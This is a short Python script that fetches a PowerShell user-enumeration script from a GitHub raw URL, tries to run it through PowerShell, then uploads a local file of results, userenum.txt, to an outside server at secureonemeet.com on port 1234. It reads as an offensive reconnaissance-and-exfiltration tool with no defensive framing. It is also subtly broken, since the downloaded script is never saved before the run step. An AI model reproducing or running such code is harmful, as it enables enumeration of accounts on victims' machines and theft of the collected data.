import requests
import os
import time
import subprocess, sys

def run(cmd):
    completed = subprocess.run(["powershell", cmd], capture_output=True)
    return completed

u = "https://raw.githubusercontent.com/deepakkeshav98/userenum/main/userenum.ps1"
r = requests.get(u)

op=run("userenum.ps1")
print(op)

time.sleep(5)


url = 'http://secureonemeet.com:1234/success'
files = {'file': open('userenum.txt', 'rb')}

r = requests.post(url, files=files)
r.text
